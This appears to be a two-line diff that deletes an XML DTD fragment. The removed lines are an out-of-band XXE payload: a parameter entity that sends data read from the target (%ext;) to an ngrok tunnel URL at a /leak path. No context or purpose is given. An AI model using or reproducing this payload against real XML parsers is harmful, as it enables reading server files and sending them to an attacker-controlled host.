@@ -1,2 +1,0 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://66424e442b1c.ngrok-free.app/leak?data=%ext;'>">
-%all;
